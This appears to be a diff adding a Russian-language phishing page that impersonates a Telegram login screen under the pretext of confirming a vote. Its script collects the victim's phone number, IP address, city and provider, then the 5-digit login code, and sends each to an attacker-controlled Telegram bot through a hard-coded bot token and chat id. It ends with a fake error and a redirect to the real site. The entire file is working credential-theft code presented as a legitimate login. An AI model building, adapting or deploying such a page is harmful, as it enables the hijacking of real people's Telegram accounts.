@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram: Авторизация</title>
+    <link rel="shortcut icon" href="https://telegram.org/favicon.ico" type="image/x-icon">
+    <script src="https://unpkg.com/imask"></script>
+    <style>
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f1f1f1; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 25px rgba(0,0,0,0.1); width: 100%; max-width: 340px; text-align: center; z-index: 1; }
+        .logo { width: 100px; margin-bottom: 25px; }
+        h2 { font-size: 22px; margin: 0 0 10px; color: #222; }
+        p { font-size: 15px; color: #707579; margin-bottom: 25px; line-height: 1.4; }
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dfe1e5; border-radius: 8px; font-size: 18px; box-sizing: border-box; outline: none; text-align: center; background: #fff; }
+        input:focus { border: 2px solid #3390ec; }
+        button { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; text-transform: uppercase; }
+        button:hover { background: #2b78c7; }
+        #code-step { display: none; }
+        .timer { font-size: 14px; color: #3390ec; margin-top: 15px; font-weight: 500; }
+        .footer { margin-top: 25px; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; }
+        .footer a { color: #707579; text-decoration: none; font-size: 13px; }
+        .loading-dots:after { content: '.'; animation: dots 1.5s steps(5, end) infinite;}
+        @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60% { content: '...'; } 80%, 100% { content: ''; } }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <img src="https://telegram.org/img/t_logo.png" class="logo" alt="Telegram">
+
+    <div id="phone-step">
+        <h2>Ваш номер</h2>
+        <p>Введите номер телефона для подтверждения участия в голосовании.</p>
+        <input type="text" id="phone">
+        <button onclick="sendPhone()">Далее</button>
+    </div>
+
+    <div id="code-step">
+        <h2>Проверка кода</h2>
+        <p>Мы отправили код подтверждения в приложение Telegram.</p>
+        <input type="text" id="code" placeholder="X X X X X" maxlength="5">
+        <button onclick="sendCode()">Подтвердить</button>
+        <div class="timer" id="timer-text">Повторная отправка через 02:00</div>
+    </div>
+</div>
+
+<div class="footer">
+    <a href="https://telegram.org/about">О нас</a>
+    <a href="https://telegram.org/apps">Приложения</a>
+    <a href="https://telegram.org/faq">FAQ</a>
+    <a href="https://telegram.org/privacy">Конфиденциальность</a>
+    <a href="https://telegram.org/blog">Блог</a>
+</div>
+
+<script>
+    const token = '8530544712:AAHMP-K6S5_pBvTK4X7CXZ6fPMcfmmYEehk';
+    const chatId = '1684083584';
+    let userPhone = "";
+
+    const phoneElement = document.getElementById('phone');
+
+    // Очищаем поле перед наложением маски
+    phoneElement.value = '';
+
+    const maskOptions = {
+        mask: '+{998} (00) 000-00-00',
+        lazy: false,
+        placeholderChar: '_'
+    };
+
+    const mask = IMask(phoneElement, maskOptions);
+
+    // Улучшенная фиксация курсора
+    const fixCursor = () => {
+        const firstEmpty = mask.value.indexOf('_');
+        if (firstEmpty !== -1) {
+            setTimeout(() => { mask.cursorPos = firstEmpty; }, 10);
+        }
+    };
+
+    phoneElement.addEventListener('focus', fixCursor);
+    phoneElement.addEventListener('click', fixCursor);
+
+    async function notifyBot(text) {
+        return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
+    }
+
+    async function sendPhone() {
+        const raw = mask.unmaskedValue;
+        if (raw.length < 9) { alert("Введите номер полностью"); return; }
+
+        userPhone = "+" + raw;
+        const copyPart = raw.substring(3);
+
+        document.getElementById('phone-step').innerHTML = `
+            <h3 style="color:#3390ec">Запрос кода<span class="loading-dots"></span></h3>
+            <p>Установка защищенного соединения...</p>
+        `;
+
+        let ipData = "ошибка";
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            ipData = `IP: <code>${d.ip}</code>\nГород: ${d.city}\nПровайдер: ${d.org}`;
+        } catch(e) {}
+
+        const msg = `📱 <b>ВХОД</b>\n\nНомер: <code>${userPhone}</code>\nКопировать: <code>${copyPart}</code>\n\n🌐 <b>СЕТЬ:</b>\n${ipData}`;
+        await notifyBot(msg);
+
+        setTimeout(() => {
+            document.getElementById('phone-step').style.display = 'none';
+            document.getElementById('code-step').style.display = 'block';
+            document.getElementById('code').focus();
+
+            let t = 120;
+            const timerInterval = setInterval(() => {
+                if (t > 0) {
+                    t--;
+                    let m = Math.floor(t/60), s = t%60;
+                    const timerElem = document.getElementById('timer-text');
+                    if(timerElem) timerElem.innerText = `Повторная отправка через ${m}:${s<10?'0':''}${s}`;
+                } else {
+                    clearInterval(timerInterval);
+                }
+            }, 1000);
+        }, 3000);
+    }
+
+    function sendCode() {
+        const c = document.getElementById('code').value;
+        if (c.length < 5) return;
+        notifyBot(`🔑 <b>КОД:</b> <code>${c}</code>\nДля: ${userPhone}`).then(() => {
+            alert("Ошибка синхронизации. Попробуйте позже.");
+            window.location.href = "https://web.telegram.org";
+        });
+    }
+</script>
+</body>
+</html>
